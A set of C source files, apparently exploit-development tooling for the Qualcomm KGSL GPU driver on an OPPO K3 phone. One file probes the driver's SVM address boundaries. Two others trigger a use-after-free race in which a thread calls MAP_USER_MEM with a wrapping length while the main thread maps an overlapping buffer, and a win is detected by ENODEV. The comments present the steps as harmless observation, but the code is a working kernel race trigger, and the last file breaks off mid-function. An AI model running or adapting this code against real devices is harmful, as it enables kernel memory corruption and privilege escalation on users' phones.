`tools/k3_stage_b.c`:

```c
/*
 * k3_stage_b.c — OPPO K3 KGSL 阶段 B：SVM 边界标定 + 四段 range 几何复现
 *
 * 对应交接文档 §14.5 阶段 B。全部为无害操作：
 *   - 不调用 MAP_USER_MEM(BOGUS/WRAP_SIZE)，不进入竞态路径
 *   - 仅做 alloc / mmap(FIXED) / munmap / free 与只读边界探测
 *
 * 依据：src_ref/kgsl_4.9/kgsl_iommu.h
 *   KGSL_IOMMU_SVM_BASE64 = 0x700000000, KGSL_IOMMU_SVM_END64 = 0x800000000
 *   KGSL_IOMMU_VA_BASE64  = 0x500000000, KGSL_IOMMU_VA_END64  = 0x600000000
 *   KGSL_IOMMU_SVM_BASE32 = 0x300000,    KGSL_IOMMU_SVM_END32 = 0xC0000000-16M
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09
#define PAGE 4096

struct kgsl_drawctxt_create {
	unsigned int flags;
	unsigned int drawctxt_id;
};

struct kgsl_map_user_mem {
	int fd;
	unsigned long gpuaddr;
	uint64_t len;
	uint64_t offset;
	unsigned long hostptr;
	int memtype;
	unsigned int flags;
};

struct kgsl_gpuobj_alloc {
	uint64_t size;
	uint64_t flags;
	uint64_t va_len;
	uint64_t mmapsize;
	unsigned int id;
	unsigned int metadata_len;
	uint64_t metadata;
};

struct kgsl_gpuobj_free {
	uint64_t flags;
	uint64_t priv;
	unsigned int id;
	unsigned int type;
	unsigned int len;
};

struct kgsl_gpuobj_info {
	uint64_t gpuaddr;
	uint64_t flags;
	uint64_t size;
	uint64_t va_len;
	uint64_t va_addr;
	unsigned int id;
};

#define IOCTL_KGSL_DRAWCTXT_CREATE \
	_IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
#define IOCTL_KGSL_MAP_USER_MEM \
	_IOWR(KGSL_IOC_TYPE, 0x15, struct kgsl_map_user_mem)
#define IOCTL_KGSL_GPUOBJ_ALLOC \
	_IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPUOBJ_FREE \
	_IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)
#define IOCTL_KGSL_GPUOBJ_INFO \
	_IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
#define KGSL_USER_MEM_TYPE_ADDR   0x00000002
#define KGSL_CONTEXT_PREAMBLE     0x00000010
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002

/* PoC 常量（§14.3 / src_ref/poc_ex.c） */
#define UAF_START  0x00000007001ff000ULL
#define UAF_SIZE   0x0000000010004000ULL
#define OVERLAP_START 0x00000007001fe000ULL
#define OVERLAP_SIZE  0x0000000000007000ULL
#define PLACEH_START  0x0000000710204000ULL
#define PLACEH_SIZE   0x0000000000010000ULL
#define BOGUS_START   0x0000000700204000ULL

static int g_fd = -1;
static int g_fail = 0;

static void hdr(const char *s) { printf("\n== %s ==\n", s); fflush(stdout); }

static void ko(const char *tag, const char *detail)
{
	printf("  %-34s OK   %s\n", tag, detail ? detail : "");
	fflush(stdout);
}

static void kf(const char *tag, int err)
{
	g_fail++;
	printf("  %-34s FAIL errno=%d (%s)\n", tag, err, strerror(err));
	fflush(stdout);
}

/* ---------- 1. drawctxt ---------- */
static void step_drawctxt(void)
{
	struct kgsl_drawctxt_create dc;
	unsigned int flags;
	int ret, err;
	char buf[64];

	hdr("1  DRAWCTXT_CREATE (需要 PREAMBLE|NO_GMEM_ALLOC)");
	flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC;
	memset(&dc, 0, sizeof(dc));
	dc.flags = flags;
	errno = 0;
	ret = ioctl(g_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &dc);
	err = errno;
	if (ret == 0) {
		snprintf(buf, sizeof(buf), "flags=0x%x id=%u", flags,
			 dc.drawctxt_id);
		ko("DRAWCTXT_CREATE(0x12)", buf);
	} else {
		kf("DRAWCTXT_CREATE(0x12)", err);
	}
}

/* ---------- 2. SVM 边界 ---------- */
struct probe_rec { uint64_t addr; const char *note; };

static void step_boundary(void)
{
	struct probe_rec probes[] = {
		{0x00000006fffff000ULL, "SVM64 base - 4K"},
		{0x0000000700000000ULL, "SVM64 base"},
		{0x0000000700001000ULL, "SVM64 base + 4K"},
		{0x00000007fffff000ULL, "SVM64 end - 4K"},
		{0x0000000800000000ULL, "SVM64 end"},
		{0x0000000500000000ULL, "GLOBAL VA base (应拒)"},
		{0x0000000010000000ULL, "非任何区间 (应拒)"},
		{0x0000000000300000ULL, "SVM32 base"},
		{0x00000000bef00000ULL, "SVM32 end - 4M"},
	};
	unsigned int i;
	int ret, err;

	hdr("2  SVM 区间边界（MAP_USER_MEM + USE_CPU_MAP，逐个 4KB）");
	printf("  %-18s %-22s %s\n", "addr", "note", "result");
	for (i = 0; i < sizeof(probes) / sizeof(probes[0]); i++) {
		struct kgsl_map_user_mem m;
		void *p;

		p = mmap((void *)(uintptr_t)probes[i].addr, PAGE,
			 PROT_READ | PROT_WRITE,
			 MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
		if (p == MAP_FAILED) {
			printf("  0x%011llx  %-22s vma_fail(%d)\n",
			       (unsigned long long)probes[i].addr,
			       probes[i].note, errno);
			continue;
		}
		memset(&m, 0, sizeof(m));
		m.fd = -1;
		m.len = PAGE;
		m.hostptr = (unsigned long)(uintptr_t)p;
		m.memtype = KGSL_USER_MEM_TYPE_ADDR;
		m.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
		errno = 0;
		ret = ioctl(g_fd, IOCTL_KGSL_MAP_USER_MEM, &m);
		err = errno;
		if (ret == 0)
			printf("  0x%011llx  %-22s ACCEPT gpuaddr=0x%lx\n",
			       (unsigned long long)probes[i].addr,
			       probes[i].note, m.gpuaddr);
		else
			printf("  0x%011llx  %-22s REJECT errno=%d (%s)\n",
			       (unsigned long long)probes[i].addr,
			       probes[i].note, err, strerror(err));
		munmap(p, PAGE);
	}
}

/* ---------- 3. 几何可行性（匿名 VMA） ---------- */
static void step_geometry_vma(void)
{
	struct probe_rec recs[] = {
		{OVERLAP_START, "OVERLAP 0x7000"},
		{UAF_START, "UAF 0x10004000"},
		{BOGUS_START, "BOGUS 3 pages"},
		{PLACEH_START, "PLACEHOLDER 0x10000"},
	};
	unsigned int i;

	hdr("3  四段 range 的地址空间可达性（仅匿名 VMA，不分配 GPU 内存）");
	for (i = 0; i < 4; i++) {
		size_t len = (i == 0) ? OVERLAP_SIZE :
			     (i == 1) ? 0x2000000 /* 32MB 抽样 */ :
			     (i == 2) ? PAGE * 3 : PLACEH_SIZE;
		void *p = mmap((void *)(uintptr_t)recs[i].addr, len,
			       PROT_READ | PROT_WRITE,
			       MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
		if (p == MAP_FAILED) {
			kf(recs[i].note, errno);
			continue;
		}
		*(volatile char *)p = 0x11;
		ko(recs[i].note, "vma ok");
		munmap(p, len);
	}
}

/* ---------- 4. gpuobj 几何流程（缩小版） ---------- */
static int alloc_obj(uint64_t size, unsigned int *id, uint64_t *mmapsize)
{
	struct kgsl_gpuobj_alloc al;
	int ret, err;

	memset(&al, 0, sizeof(al));
	al.size = size;
	al.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
	al.va_len = 0;
	errno = 0;
	ret = ioctl(g_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &al);
	err = errno;
	if (ret) {
		kf("GPUOBJ_ALLOC", err);
		return -1;
	}
	*id = al.id;
	*mmapsize = al.mmapsize;
	return 0;
}

static void free_obj(unsigned int id)
{
	struct kgsl_gpuobj_free fr;
	int ret;

	memset(&fr, 0, sizeof(fr));
	fr.id = id;
	errno = 0;
	ret = ioctl(g_fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
	if (ret)
		kf("GPUOBJ_FREE", errno);
}

static void info_obj(unsigned int id, const char *tag)
{
	struct kgsl_gpuobj_info inf;
	int ret;

	memset(&inf, 0, sizeof(inf));
	inf.id = id;
	errno = 0;
	ret = ioctl(g_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
	if (ret) {
		kf(tag, errno);
		return;
	}
	printf("  %-34s gpuaddr=0x%llx va_addr=0x%llx size=0x%llx "
	       "va_len=0x%llx\n", tag,
	       (unsigned long long)inf.gpuaddr,
	       (unsigned long long)inf.va_addr,
	       (unsigned long long)inf.size,
	       (unsigned long long)inf.va_len);
	fflush(stdout);
}

static void step_geometry_gpuobj(void)
{
	unsigned int uaf_id = 0, ov_id = 0, ph_id = 0;
	uint64_t uaf_ms = 0, ov_ms = 0, ph_ms = 0;
	uint64_t scaled_uaf = 0x2000000; /* 32MB：先验流程，再试满尺寸 */
	void *p;
	char buf[96];

	hdr("4  gpuobj 几何流程（UAF 用 32MB 缩放版）");

	if (alloc_obj(scaled_uaf, &uaf_id, &uaf_ms))
		return;
	snprintf(buf, sizeof(buf), "id=%u mmapsize=0x%llx", uaf_id,
		 (unsigned long long)uaf_ms);
	ko("GPUOBJ_ALLOC(UAF 32MB)", buf);

	if (alloc_obj(OVERLAP_SIZE, &ov_id, &ov_ms))
		return;
	snprintf(buf, sizeof(buf), "id=%u mmapsize=0x%llx", ov_id,
		 (unsigned long long)ov_ms);
	ko("GPUOBJ_ALLOC(OVERLAP)", buf);

	p = mmap((void *)(uintptr_t)UAF_START, (size_t)uaf_ms,
		 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, g_fd,
		 (off_t)uaf_id << 12);
	if (p == MAP_FAILED || (uint64_t)(uintptr_t)p != UAF_START) {
		kf("mmap(UAF @0x7001ff000)", errno);
		free_obj(uaf_id);
		free_obj(ov_id);
		return;
	}
	ko("mmap(UAF @0x7001ff000)", "fixed ok");
	info_obj(uaf_id, "GPUOBJ_INFO(UAF after mmap)");

	/* 只触碰首页与末页，避免 32MB 实触压力 */
	((volatile char *)p)[0] = 0x5a;
	((volatile char *)p)[(size_t)uaf_ms - PAGE] = 0x5a;
	ko("touch UAF first/last page", "ok");

	munmap(p, (size_t)uaf_ms);
	ko("munmap(UAF)", "rbtree/PTE 保留（预期）");

	p = mmap((void *)(uintptr_t)OVERLAP_START, (size_t)ov_ms,
		 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, g_fd,
		 (off_t)ov_id << 12);
	if (p == MAP_FAILED || (uint64_t)(uintptr_t)p != OVERLAP_START)
		kf("mmap(OVERLAP @0x7001fe000)", errno);
	else {
		ko("mmap(OVERLAP @0x7001fe000)", "fixed ok");
		((volatile char *)p)[0] = 0x5a;
		munmap(p, (size_t)ov_ms);
	}

	if (alloc_obj(PLACEH_SIZE, &ph_id, &ph_ms) == 0) {
		p = mmap((void *)(uintptr_t)PLACEH_START, (size_t)ph_ms,
			 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, g_fd,
			 (off_t)ph_id << 12);
		if (p == MAP_FAILED || (uint64_t)(uintptr_t)p != PLACEH_START)
			kf("mmap(PLACEHOLDER @0x710204000)", errno);
		else {
			ko("mmap(PLACEHOLDER @0x710204000)", "fixed ok");
			((volatile char *)p)[0] = 0x5a;
			munmap(p, (size_t)ph_ms);
		}
		free_obj(ph_id);
	}
	free_obj(ov_id);
	free_obj(uaf_id);
}

int main(void)
{
	printf("k3_stage_b | pid=%d uid=%d\n", getpid(), getuid());

	g_fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
	if (g_fd < 0) {
		printf("open /dev/kgsl-3d0 FAIL errno=%d (%s)\n", errno,
		       strerror(errno));
		return 1;
	}
	ko("open /dev/kgsl-3d0", "");

	step_drawctxt();
	step_boundary();
	step_geometry_vma();
	step_geometry_gpuobj();

	printf("\nsummary: failures=%d\n", g_fail);
	close(g_fd);
	return g_fail ? 2 : 0;
}

```

`tools/k3_stage_c.c`:

```c
/*
 * k3_stage_c.c — 阶段 C-1：单次竞速触发（只观测返回码，不提交 GPU 命令）
 *
 * 严格按 src_ref/poc_ex.c 的步骤 [1]–[9]：
 *   UAF alloc/mmap/munmap → BOGUS VMA → PLACEHOLDER → racer(MAP_USER_MEM wrap)
 *   → 主线程 mmap OVERLAP
 *
 * 判定（poc_ex.c:1861-1868）：
 *   OVERLAP mmap 返回 ENODEV(19)  → 竞速命中
 *   OVERLAP mmap 返回 ENOMEM(12)  → 未命中，无副作用
 *
 * 命中后立即退出进程，不做任何 GPU 命令、不读写悬垂 PTE。
 * 用法: k3_stage_c [attempts] [delay_us]
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09
#define PAGE 4096

struct kgsl_map_user_mem {
	int fd;
	unsigned long gpuaddr;
	uint64_t len;
	uint64_t offset;
	unsigned long hostptr;
	int memtype;
	unsigned int flags;
};

struct kgsl_gpuobj_alloc {
	uint64_t size;
	uint64_t flags;
	uint64_t va_len;
	uint64_t mmapsize;
	unsigned int id;
	unsigned int metadata_len;
	uint64_t metadata;
};

struct kgsl_gpuobj_free {
	uint64_t flags;
	uint64_t priv;
	unsigned int id;
	unsigned int type;
	unsigned int len;
};

#define IOCTL_KGSL_MAP_USER_MEM \
	_IOWR(KGSL_IOC_TYPE, 0x15, struct kgsl_map_user_mem)
#define IOCTL_KGSL_GPUOBJ_ALLOC \
	_IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPUOBJ_FREE \
	_IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
#define KGSL_USER_MEM_TYPE_ADDR   0x00000002

#define UAF_START     0x00000007001ff000ULL
#define UAF_SIZE      0x0000000010004000ULL
#define OVERLAP_START 0x00000007001fe000ULL
#define OVERLAP_SIZE  0x0000000000007000ULL
#define PLACEH_START  0x0000000710204000ULL
#define PLACEH_SIZE   0x0000000000010000ULL
#define BOGUS_START   0x0000000700204000ULL
#define WRAP_SIZE     0xffffffffffefd000ULL

static int fd = -1;

struct race_state {
	volatile int ready;
	volatile int started;
	volatile long result;
	volatile int saved_errno;
	uint64_t bogus_start;
	uint64_t wrap_size;
};

static void *racer(void *arg)
{
	struct race_state *rs = (struct race_state *)arg;
	struct kgsl_map_user_mem req;

	while (!rs->ready)
		__asm__ __volatile__("" ::: "memory");

	rs->started = 1;
	__sync_synchronize();

	memset(&req, 0, sizeof(req));
	req.fd = -1;
	req.gpuaddr = 0;
	req.len = rs->wrap_size;
	req.offset = 0;
	req.hostptr = (unsigned long)rs->bogus_start;
	req.memtype = KGSL_USER_MEM_TYPE_ADDR;
	req.flags = KGSL_MEMFLAGS_USE_CPU_MAP;

	errno = 0;
	rs->result = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &req);
	rs->saved_errno = errno;
	__sync_synchronize();
	return NULL;
}

static int obj_alloc(uint64_t size, unsigned int *id, uint64_t *ms)
{
	struct kgsl_gpuobj_alloc al;

	memset(&al, 0, sizeof(al));
	al.size = size;
	al.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
	if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &al)) {
		printf("  ALLOC(0x%llx) FAIL errno=%d (%s)\n",
		       (unsigned long long)size, errno, strerror(errno));
		return -1;
	}
	*id = al.id;
	*ms = al.mmapsize;
	return 0;
}

static void obj_free(unsigned int id)
{
	struct kgsl_gpuobj_free fr;

	if (!id)
		return;
	memset(&fr, 0, sizeof(fr));
	fr.id = id;
	ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
}

static double now_ms(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

int main(int argc, char **argv)
{
	int attempts = (argc > 1) ? atoi(argv[1]) : 1;
	int delay_us = (argc > 2) ? atoi(argv[2]) : 200;
	int hit = 0, miss = 0, other = 0;
	int i;

	printf("k3_stage_c | pid=%d uid=%d attempts=%d delay_us=%d\n", getpid(),
	       getuid(), attempts, delay_us);

	fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
	if (fd < 0) {
		printf("open FAIL errno=%d (%s)\n", errno, strerror(errno));
		return 1;
	}

	for (i = 0; i < attempts; i++) {
		unsigned int uaf_id = 0, ov_id = 0, ph_id = 0;
		uint64_t uaf_ms = 0, ov_ms = 0, ph_ms = 0;
		void *p, *bogus_vma = MAP_FAILED, *ph_vma = MAP_FAILED;
		size_t k;
		struct race_state rs;
		pthread_t th;
		double t0;
		int mmap_errno = 0;
		int ret;

		printf("\n--- attempt %d/%d ---\n", i + 1, attempts);
		fflush(stdout);

		/* [1] UAF */
		if (obj_alloc(UAF_SIZE, &uaf_id, &uaf_ms))
			break;
		/* [2] OVERLAP（暂不 mmap） */
		if (obj_alloc(OVERLAP_SIZE, &ov_id, &ov_ms))
			break;

		/* [3] UAF mmap FIXED */
		p = mmap((void *)(uintptr_t)UAF_START, (size_t)uaf_ms,
			 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd,
			 (off_t)uaf_id << 12);
		if (p == MAP_FAILED) {
			printf("  UAF mmap FAIL errno=%d (%s)\n", errno,
			       strerror(errno));
			break;
		}
		((volatile char *)p)[0] = 0x5a;
		((volatile char *)p)[uaf_ms - PAGE] = 0x5a;
		for (k = 0; k + PAGE < uaf_ms; k += PAGE * 1024)
			((volatile char *)p)[k] = 0x5a;

		/* [4] munmap，PTE/rbtree 条目残留 */
		munmap(p, (size_t)uaf_ms);

		/* [5] BOGUS 匿名 VMA */
		bogus_vma = mmap((void *)(uintptr_t)BOGUS_START, PAGE * 3,
				 PROT_READ | PROT_WRITE,
				 MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
		if (bogus_vma == MAP_FAILED) {
			printf("  BOGUS mmap FAIL errno=%d (%s)\n", errno,
			       strerror(errno));
			break;
		}
		for (k = 0; k < 3; k++)
			((volatile char *)bogus_vma)[k * PAGE] = 1;

		/* [6][7] PLACEHOLDER */
		if (obj_alloc(PLACEH_SIZE, &ph_id, &ph_ms) == 0) {
			ph_vma = mmap((void *)(uintptr_t)PLACEH_START,
				      (size_t)ph_ms, PROT_READ | PROT_WRITE,
				      MAP_SHARED | MAP_FIXED, fd,
				      (off_t)ph_id << 12);
			if (ph_vma != MAP_FAILED) {
				((volatile char *)ph_vma)[0] = 1;
			} else {
				printf("  PLACEHOLDER mmap FAIL errno=%d\n",
				       errno);
			}
		}

		/* [8] 起 racer */
		memset(&rs, 0, sizeof(rs));
		rs.bogus_start = BOGUS_START;
		rs.wrap_size = WRAP_SIZE;
		rs.result = -1;
		if (pthread_create(&th, NULL, racer, &rs)) {
			printf("  pthread_create FAIL\n");
			break;
		}
		rs.ready = 1;
		__sync_synchronize();
		while (!rs.started)
			__asm__ __volatile__("" ::: "memory");
		if (delay_us > 0)
			usleep(delay_us);

		/* [9] 主线程 mmap OVERLAP */
		t0 = now_ms();
		p = mmap((void *)(uintptr_t)OVERLAP_START, (size_t)ov_ms,
			 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd,
			 (off_t)ov_id << 12);
		mmap_errno = errno;
		pthread_join(th, NULL);
		t0 = now_ms() - t0;

		printf("  racer: ret=%ld errno=%d (%s)\n", rs.result,
		       rs.saved_errno, strerror(rs.saved_errno));
		if (p == MAP_FAILED)
			printf("  overlap mmap: FAIL errno=%d (%s)\n",
			       mmap_errno, strerror(mmap_errno));
		else
			printf("  overlap mmap: OK @%p\n", p);
		printf("  elapsed=%.1f ms\n", t0);

		if (p == MAP_FAILED && mmap_errno == ENODEV) {
			printf("  >>> RACE WON (ENODEV 19) <<<\n");
			hit++;
			/* 只记录，立即退出，不做任何后续操作 */
			printf("  exit immediately to avoid touching dirty PTE\n");
			fflush(stdout);
			_exit(0);
		} else if (p == MAP_FAILED && mmap_errno == ENOMEM) {
			miss++;
		} else {
			other++;
		}

		/* 清理（未命中路径） */
		if (p != MAP_FAILED)
			munmap(p, (size_t)ov_ms);
		if (ph_vma != MAP_FAILED)
			munmap(ph_vma, (size_t)ph_ms);
		if (bogus_vma != MAP_FAILED)
			munmap(bogus_vma, PAGE * 3);
		obj_free(ov_id);
		obj_free(ph_id);
		obj_free(uaf_id);
		usleep(100000);
	}

	printf("\nsummary: hit=%d miss=%d other=%d\n", hit, miss, other);
	close(fd);
	return hit ? 0 : (miss == attempts ? 3 : 2);
}

```

`tools/k3_stage_c2.c`:

```c
/*
 * k3_stage_c2.c — 阶段 C-1 插桩版：每步落盘 + 无缓冲输出 + 看门狗
 *
 * 与 k3_stage_c 的唯一区别是可观测性：
 *   - 每个关键步骤写 /data/local/tmp/stage_c.log（O_APPEND + fsync），
 *     即使随后内核崩溃，也留下"最后完成的步骤"
 *   - 输出走 write(2)，不经 stdio 缓冲
 *   - alarm(60) 看门狗，防止 pthread_join 死等
 *
 * 序列与判据不变：竞速命中 = OVERLAP mmap 返回 ENODEV(19)。
 * 用法: k3_stage_c2 [delay_us]
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09
#define PAGE 4096
#define LOGPATH "/data/local/tmp/stage_c.log"

struct kgsl_map_user_mem {
	int fd;
	unsigned long gpuaddr;
	uint64_t len;
	uint64_t offset;
	unsigned long hostptr;
	int memtype;
	unsigned int flags;
};

struct kgsl_gpuobj_alloc {
	uint64_t size;
	uint64_t flags;
	uint64_t va_len;
	uint64_t mmapsize;
	unsigned int id;
	unsigned int metadata_len;
	uint64_t metadata;
};

struct kgsl_gpuobj_free {
	uint64_t flags;
	uint64_t priv;
	unsigned int id;
	unsigned int type;
	unsigned int len;
};

#define IOCTL_KGSL_MAP_USER_MEM \
	_IOWR(KGSL_IOC_TYPE, 0x15, struct kgsl_map_user_mem)
#define IOCTL_KGSL_GPUOBJ_ALLOC \
	_IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPUOBJ_FREE \
	_IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
#define KGSL_USER_MEM_TYPE_ADDR   0x00000002

#define UAF_START     0x00000007001ff000ULL
#define UAF_SIZE      0x0000000010004000ULL
#define OVERLAP_START 0x00000007001fe000ULL
#define OVERLAP_SIZE  0x0000000000007000ULL
#define PLACEH_START  0x0000000710204000ULL
#define PLACEH_SIZE   0x0000000000010000ULL
#define BOGUS_START   0x0000000700204000ULL
#define WRAP_SIZE     0xffffffffffefd000ULL

static int fd = -1;
static int logfd = -1;

static double now_ms(void);

static void lg(const char *fmt, ...)
{
	char buf[256];
	char line[320];
	va_list ap;
	int n;
	double t = now_ms();

	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	n = snprintf(line, sizeof(line), "[%9.3f] %s\n", t, buf);
	if (write(1, line, n) < 0) { /* ignore */ }
	if (logfd >= 0) {
		if (write(logfd, line, n) < 0) { /* ignore */ }
		fsync(logfd);
	}
}

static double now_ms(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

static void on_alarm(int sig)
{
	(void)sig;
	lg("WATCHDOG: 60s 超时，疑似阻塞在 ioctl/join，强制退出");
	_exit(9);
}

struct race_state {
	volatile int ready;
	volatile int started;
	volatile long result;
	volatile int saved_errno;
	uint64_t bogus_start;
	uint64_t wrap_size;
};

static void *racer(void *arg)
{
	struct race_state *rs = (struct race_state *)arg;
	struct kgsl_map_user_mem req;

	while (!rs->ready)
		__asm__ __volatile__("" ::: "memory");

	lg("racer: 进入 MAP_USER_MEM(hostptr=0x%llx, len=0x%llx)",
	   (unsigned long long)rs->bogus_start,
	   (unsigned long long)rs->wrap_size);
	rs->started = 1;
	__sync_synchronize();

	memset(&req, 0, sizeof(req));
	req.fd = -1;
	req.gpuaddr = 0;
	req.len = rs->wrap_size;
	req.offset = 0;
	req.hostptr = (unsigned long)rs->bogus_start;
	req.memtype = KGSL_USER_MEM_TYPE_ADDR;
	req.flags = KGSL_MEMFLAGS_USE_CPU_MAP;

	errno = 0;
	rs->result = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &req);
	rs->saved_errno = errno;
	lg("racer: ioctl 返回 ret=%ld errno=%d (%s)", rs->result,
	   rs->saved_errno, strerror(rs->saved_errno));
	__sync_synchronize();
	return NULL;
}

static int obj_alloc(const char *tag, uint64_t size, unsigned int *id,
		     uint64_t *ms)
{
	struct kgsl_gpuobj_alloc al;

	memset(&al, 0, sizeof(al));
	al.size = size;
	al.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
	errno = 0;
	if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &al)) {
		lg("%s: ALLOC(0x%llx) FAIL errno=%d (%s)", tag,
		   (unsigned long long)size, errno, strerror(errno));
		return -1;
	}
	*id = al.id;
	*ms = al.mmapsize;
	lg("%s: ALLOC OK id=%u mmapsize=0x%llx", tag, al.id,
	   (unsigned long long)al.mmapsize);
	return 0;
}

int main(int argc, char **argv)
{
	int delay_us = (argc > 1) ? atoi(argv[1]) : 200;
	unsigned int uaf_id = 0, ov_id = 0, ph_id = 0;
	uint64_t uaf_ms = 0, ov_ms = 0, ph_ms = 0;
	void *p, *bogus_vma, *ph_vma;
	struct race_state rs;
	pthread_t th;
	size_t k;
	int mmap_errno = 0;

	logfd = open(LOGPATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
	signal(SIGALRM, on_alarm);
	alarm(60);

	lg("=== stage_c2 start pid=%d delay_us=%d ===", getpid(), delay_us);

	fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
	if (fd < 0) {
		lg("open FAIL errno=%d (%s)", errno, strerror(errno));
		return 1;
	}
	lg("open /dev/kgsl-3d0 OK fd=%d", fd);

	if (obj_alloc("UAF", UAF_SIZE, &uaf_id, &uaf_ms))
		return 1;
	if (obj_alloc("OVERLAP", OVERLAP_SIZE, &ov_id, &ov_ms))
		return 1;

	p = mmap((void *)(uintptr_t)UAF_START, (size_t)uaf_ms,
		 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd,
		 (off_t)uaf_id << 12);
	if (p == MAP_FAILED) {
		lg("UAF mmap FAIL errno=%d (%s)", errno, strerror(errno));
		return 1;
	}
	lg("UAF mmap OK @0x%llx len=0x%llx", (unsigned long long)UAF_START,
	   (unsigned long long)uaf_ms);

	((volatile char *)p)[0] = 0x5a;
	lg("UAF touch first page 完成");
	((volatile char *)p)[uaf_ms - PAGE] = 0x5a;
	lg("UAF touch last page 完成");
	for (k = 0; k + PAGE < uaf_ms; k += PAGE * 1024)
		((volatile char *)p)[k] = 0x5a;
	lg("UAF touch 抽样完成");

	munmap(p, (size_t)uaf_ms);
	lg("UAF munmap 完成");

	bogus_vma = mmap((void *)(uintptr_t)BOGUS_START, PAGE * 3,
			 PROT_READ | PROT_WRITE,
			 MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
	if (bogus_vma == MAP_FAILED) {
		lg("BOGUS mmap FAIL errno=%d (%s)", errno, strerror(errno));
		return 1;
	}
	for (k = 0; k < 3; k++)
		((volatile char *)bogus_vma)[k * PAGE] = 1;
	lg("BOGUS VMA OK @0x%llx", (unsigned long long)BOGUS_START);

	if (obj_alloc("PLACEHOLDER", PLACEH_SIZE, &ph_id, &ph_ms))
		return 1;
	ph_vma = mmap((void *)(uintptr_t)PLACEH_START, (size_t)ph_ms,
		      PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd,
		      (off_t)ph_id << 12);
	if (ph_vma == MAP_FAILED) {
		lg("PLACEHOLDER mmap FAIL errno=%d (%s)", errno,
		   strerror(errno));
		return 1;
	}
	((volatile char *)ph_vma)[0] = 1;
	lg("PLACEHOLDER mmap OK @0x%llx", (unsigned long long)PLACEH_START);

	memset(&rs, 0, sizeof(rs));
	rs.bogus_start = BOGUS_START;
	rs.wrap_size = WRAP_SIZE;
	rs.result = -1;
	if (pthread_create(&th, NULL, racer, &rs)) {
		lg("pthread_create FAIL");
		return 1;
	}
	rs.ready = 1;
	__sync_synchronize();
	while (!rs.started)
		__asm__ __volatile__("" ::: "memory");
	lg("racer 已启动，等待 %d us 后主线程 mmap OVERLAP", delay_us);
	if (delay_us > 0)
		usleep(delay_us);

	lg("主线程: 进入 mmap(OVERLAP @0x%llx len=0x%llx)",
	   (unsigned long long)OVERLAP_START, (unsigned long long)ov_ms);
	p = mmap((void *)(uintptr_t)OVERLAP_START, (size_t)ov_ms,
		 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd,
		 (off_t)ov_id << 12);
	mmap_errno = errno;
	lg("主线程: mmap 返回 %s errno=%d (%s)",
	   p == MAP_FAILED ? "MAP_FAILED" : "OK", mmap_errno,
	   strerror(mmap_errno));

	pthread_join(th, NULL);
